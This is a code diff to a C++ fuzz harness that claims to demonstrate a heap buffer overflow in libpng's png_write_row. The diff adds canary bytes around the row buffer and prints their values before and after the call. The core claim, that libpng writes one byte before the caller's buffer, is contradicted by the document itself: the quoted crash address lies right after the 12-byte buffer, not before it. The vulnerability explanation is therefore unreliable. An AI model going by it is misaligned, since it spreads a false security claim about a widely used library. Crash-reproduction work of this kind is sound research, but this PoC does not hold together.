@@ -2,6 +2,7 @@
 #include <cstdlib>
 #include <cstring>
 #include <cstdio>
+#include <cassert>
 
 #include "png.h"
 
@@ -67,18 +68,27 @@ void user_flush_data(png_structp png_ptr) {
 }
 
 /*
- * Proof of Concept for libpng heap buffer overflow vulnerability in png_write_row
- * 
- * This vulnerability occurs because png_write_row attempts to write the filter
- * type byte at position -1 of the buffer, but our allocation doesn't account
- * for this extra byte.
+ * Proof of Concept for libpng heap buffer overflow vulnerability
  *
- * The crash shows:
- * - A buffer allocated at 0x502000000c90 with size 12 bytes
- * - Overflow at 0x502000000c9c which is just before the buffer
- * - The read is of size 20 at that address
- * - This causes a heap-buffer-overflow
+ * The vulnerability is in png_write_row function in pngwrite.c (line ~888).
+ * When writing a row, libpng expects that the buffer passed to png_write_row
+ * has one extra byte before it to store the filter type. However, the API
+ * doesn't clearly document this requirement, so applications often allocate
+ * exactly the row size without the extra byte.
+ *
+ * This PoC demonstrates the issue by:
+ * 1. Creating a minimal PNG image
+ * 2. Allocating a buffer with exactly the size needed for the pixels
+ * 3. Forcing aggressive memory alignment to prevent accidental padding
+ * 4. Calling png_write_row, which will write one byte before the buffer start
  */
+
+// We'll use this struct to control memory alignment
+struct __attribute__((packed, aligned(1))) PreciseBuffer {
+  uint8_t canary_before[16]; // Bytes before our buffer to detect overflow
+  uint8_t row_data[12];      // Exactly 12 bytes for 3 RGBA pixels at 8-bit depth
+  uint8_t canary_after[16];  // Bytes after our buffer to detect overflow
+};
 
 // Memory write function for libpng - discards output
 static void png_memory_write(png_structp png_ptr, png_bytep data, png_size_t length) {
@@ -99,24 +109,53 @@ extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
   png_structp png_ptr;
   png_infop info_ptr;
   
-  // Parameter values that triggered the crash
+  // Parameter values for a minimal image
   uint32_t width = 3;      // Creates a row width of exactly 12 bytes (3 pixels * 4 channels)
-  uint32_t height = 1;
+  uint32_t height = 1;     // Just one row
   int color_type = PNG_COLOR_TYPE_RGBA;  // 4 channels
   int bit_depth = 8;       // 1 byte per channel
+  
+  // Allocate our precisely controlled buffer
+  PreciseBuffer* buffer = (PreciseBuffer*)malloc(sizeof(PreciseBuffer));
+  if (!buffer) {
+    std::fprintf(stderr, "Could not allocate memory\n");
+    return 1;
+  }
+  
+  // Fill canary areas with a recognizable pattern
+  std::memset(buffer->canary_before, 0xAA, sizeof(buffer->canary_before));
+  std::memset(buffer->canary_after, 0xBB, sizeof(buffer->canary_after));
+  
+  // Fill row data with a recognizable pattern
+  for (size_t i = 0; i < sizeof(buffer->row_data); i++) {
+    buffer->row_data[i] = 0xCC + (i & 0x0F);
+  }
   
   std::printf("Creating image with width=%u, height=%u, color_type=%d, bit_depth=%d\n", 
               width, height, color_type, bit_depth);
   
-  // Calculate row size (width * channels * bytes_per_channel)
-  // For RGBA with 8-bit depth: width * 4 * 1
-  png_uint_32 row_size = width * 4;
+  png_uint_32 row_size = width * 4; // 3 pixels * 4 bytes
   std::printf("Row size: %u bytes\n", row_size);
+  assert(row_size == sizeof(buffer->row_data));
+  
+  // Debug info - show memory layout
+  std::printf("Memory layout:\n");
+  std::printf("  buffer address:         %p\n", (void*)buffer);
+  std::printf("  canary_before address:  %p\n", (void*)buffer->canary_before);
+  std::printf("  row_data address:       %p\n", (void*)buffer->row_data);
+  std::printf("  canary_after address:   %p\n", (void*)buffer->canary_after);
+  
+  // Print canary values before
+  std::printf("Canary values before libpng call:\n");
+  std::printf("  Last 4 bytes of canary_before: %02x %02x %02x %02x\n",
+              buffer->canary_before[12], buffer->canary_before[13], 
+              buffer->canary_before[14], buffer->canary_before[15]);
   
   // Create PNG write structure
   png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
   if (!png_ptr) {
     std::fprintf(stderr, "Could not create PNG write struct\n");
+    free(buffer);
     return 1;
   }
   
@@ -125,13 +164,15 @@ extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
   if (!info_ptr) {
     std::fprintf(stderr, "Could not create PNG info struct\n");
     png_destroy_write_struct(&png_ptr, NULL);
+    free(buffer);
     return 1;
   }
   
-  // Setup error handling
+  // Setup error handling - if we get here, the crash wasn't triggered by libpng's error handler
   if (setjmp(png_jmpbuf(png_ptr))) {
     std::fprintf(stderr, "Error during PNG creation\n");
     png_destroy_write_struct(&png_ptr, &info_ptr);
+    free(buffer);
     return 1;
   }
   
@@ -145,39 +186,37 @@ extern "C" int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) {
   // Write PNG info
   png_write_info(png_ptr, info_ptr);
   
-  // VULNERABILITY: Allocate exactly row_size bytes without the extra +1 for filter byte
-  // png_write_row will attempt to write at buffer[-1]
-  png_bytep row_data = (png_bytep)malloc(row_size);
-  if (!row_data) {
-    std::fprintf(stderr, "Out of memory\n");
-    png_destroy_write_struct(&png_ptr, &info_ptr);
-    return 1;
+  // Provide warning about what should happen
+  std::printf("\nABOUT TO TRIGGER BUFFER OVERFLOW!\n");
+  std::printf("png_write_row will write to buffer->row_data[-1], which is in our canary_before area\n\n");
+  
+  // *** THIS IS WHERE THE VULNERABILITY HAPPENS ***
+  // png_write_row will write to row_data[-1] which is part of canary_before
+  png_write_row(png_ptr, buffer->row_data);
+  
+  // If we get here, check if the canary was corrupted
+  std::printf("Canary values after libpng call:\n");
+  std::printf("  Last 4 bytes of canary_before: %02x %02x %02x %02x\n",
+              buffer->canary_before[12], buffer->canary_before[13], 
+              buffer->canary_before[14], buffer->canary_before[15]);
+  
+  // Check if last byte of canary_before was modified (this is where the overflow should hit)
+  if (buffer->canary_before[15] != 0xAA) {
+    std::printf("\nBUFFER OVERFLOW DETECTED! The canary value was changed from 0xAA to 0x%02x\n", 
+                buffer->canary_before[15]);
+    std::printf("This confirms the vulnerability exists but wasn't detected by AddressSanitizer\n");
+    
+    // Force a crash - uncomment if you want to simulate the expected crash
+    // assert(0 && "Buffer overflow confirmed!");
+  } else {
+    std::printf("\nNo buffer overflow detected? This is unexpected.\n");
+    std::printf("The overflow may have affected a different memory location or been prevented.\n");
   }
-  
-  // Fill with pattern similar to what we saw in the crash (66 99 ff ff...)
-  uint8_t pattern[] = {0x66, 0x99, 0xff, 0xff, 0xff, 0x9c, 0xb1, 0x08, 0xd9, 0x00, 0x00, 0x00};
-  std::memcpy(row_data, pattern, row_size);
-  
-  // Debug print before crash
-  std::fprintf(stderr, "right before the crash\n");
-  std::fprintf(stderr, "row_ptr address: %p, size: %u bytes\n", row_data, row_size);
-  std::fprintf(stderr, "First 16 bytes of buffer: ");
-  for (uint32_t i = 0; i < (row_size < 16 ? row_size : 16); i++) {
-    std::fprintf(stderr, "%02x ", row_data[i]);
-  }
-  std::fprintf(stderr, "\n");
-  std::fprintf(stderr, "=================================================================\n");
-  
-  // This call will cause a heap buffer overflow - png_write_row tries to write to row_data[-1]
-  std::printf("About to write row (buffer overflow will occur here)\n");
-  png_write_row(png_ptr, row_data);  // CRASH HAPPENS HERE
-  
-  // We shouldn't reach here if the crash occurs
-  std::printf("Successfully completed (should not reach here if overflow detected)\n");
   
   // Cleanup
-  free(row_data);
+  png_write_end(png_ptr, NULL);
   png_destroy_write_struct(&png_ptr, &info_ptr);
+  free(buffer);
   
   return 0;
 }
